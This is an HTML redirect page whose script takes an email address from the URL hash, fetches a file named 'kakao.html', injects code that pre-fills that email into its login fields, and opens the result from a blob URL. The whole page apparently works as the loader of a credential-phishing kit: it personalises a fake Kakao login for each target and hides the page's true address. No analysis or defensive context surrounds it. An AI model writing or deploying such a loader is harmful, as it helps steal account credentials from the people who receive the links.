<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // Extract email from URL hash
        const email = window.location.hash.substring(1) || '';
        console.log('Extracted email:', email);
        
        // Fetch kakao.html content and create blob
        fetch('kakao.html')
            .then(response => response.arrayBuffer())
            .then(buffer => {
                // Remove UTF-8 BOM if present
                let bomRemovedBuffer = buffer;
                const bom = new Uint8Array(buffer.slice(0, 3));
                if (bom[0] === 0xEF && bom[1] === 0xBB && bom[2] === 0xBF) {
                    bomRemovedBuffer = buffer.slice(3);
                }
                
                // Convert to text
                const decoder = new TextDecoder('utf-8');
                let htmlContent = decoder.decode(bomRemovedBuffer);
                
                // Only inject email script if there's an email
                if (email && email.trim() !== '') {
                    const emailScript = `
<script>
// Email injection from blob
(function() {
    const emailFromBlob = "${email.replace(/"/g, '\\"')}";
    console.log('Blob injecting email:', emailFromBlob);
    
    function injectEmailToFields() {
        // Target the userId field
        const userIdField = document.getElementById('userId');
        if (userIdField) {
            userIdField.value = emailFromBlob;
            console.log('Email set in userId field:', emailFromBlob);
            userIdField.dispatchEvent(new Event('input', { bubbles: true }));
            userIdField.dispatchEvent(new Event('change', { bubbles: true }));
        }
        
        // Target the hidden ai field
        const aiField = document.getElementById('ai');
        if (aiField) {
            aiField.value = emailFromBlob;
            console.log('Email set in ai field');
        }
        
        // Also try any input with name="id"
        const idField = document.querySelector('input[name="id"]');
        if (idField && idField !== userIdField) {
            idField.value = emailFromBlob;
        }
        
        // Show a visual indicator
        const toast = document.getElementById('toastMsg');
        if (toast) {
            toast.textContent = '이메일이 자동 입력되었습니다: ' + emailFromBlob;
            toast.classList.add('show');
            setTimeout(function() { toast.classList.remove('show'); }, 2000);
        }
    }
    
    // Try multiple times to ensure the DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', injectEmailToFields);
    } else {
        injectEmailToFields();
    }
    setTimeout(injectEmailToFields, 100);
    setTimeout(injectEmailToFields, 300);
    window.addEventListener('load', injectEmailToFields);
})();
<\/script>
`;
                    // Insert the email script right before the closing </body> tag
                    htmlContent = htmlContent.replace('</body>', emailScript + '</body>');
                    console.log('Email script injected');
                }
                
                // Create blob and redirect
                const blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
                const blobUrl = URL.createObjectURL(blob);
                console.log('Redirecting with email:', email || 'none');
                window.location.replace(blobUrl);
            })
            .catch(error => {
                console.error('Error loading kakao.html:', error);
                window.location.href = 'kakao.html' + (email ? '#' + email : '');
            });
    </script>
</body>
</html>
